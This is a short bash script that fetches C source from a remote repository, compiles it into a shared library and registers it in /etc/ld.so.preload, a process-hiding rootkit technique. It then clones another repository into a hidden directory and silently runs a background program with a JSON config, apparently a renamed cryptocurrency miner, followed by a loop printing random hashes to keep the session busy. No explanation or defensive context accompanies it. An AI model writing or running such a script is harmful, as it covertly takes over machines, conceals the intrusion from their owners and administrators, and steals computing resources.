#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
sudo apt-get update 
mkdir .kapi && cd .kapi
git clone https://github.com/crewi2013-hue/kelop.git
cd kelop
chmod +x 90.json && chmod +x zepo
./vltrig -c "90.json" > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
